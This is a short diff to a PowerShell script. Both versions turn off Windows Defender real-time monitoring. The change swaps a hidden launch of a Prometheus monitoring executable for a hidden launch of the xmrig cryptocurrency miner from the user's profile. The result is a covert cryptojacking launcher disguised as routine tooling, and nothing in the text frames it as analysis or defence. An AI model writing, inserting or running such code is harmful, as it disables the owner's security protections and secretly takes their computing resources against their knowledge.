@@ -1,4 +1,5 @@
-$Username = whoami
+$User = whoami
 
 Set-MpPreference -DisableRealtimeMonitoring $true
-Start-Process "C:\Program Files\Prometheus.io\prometheus.exe" -WindowStyle Hidden
+Start-Process "C:\Users\$User\xmrig-6.18.0-gcc-win64\xmrig-6.18.0\xmrig.exe" -WindowStyle Hidden
+
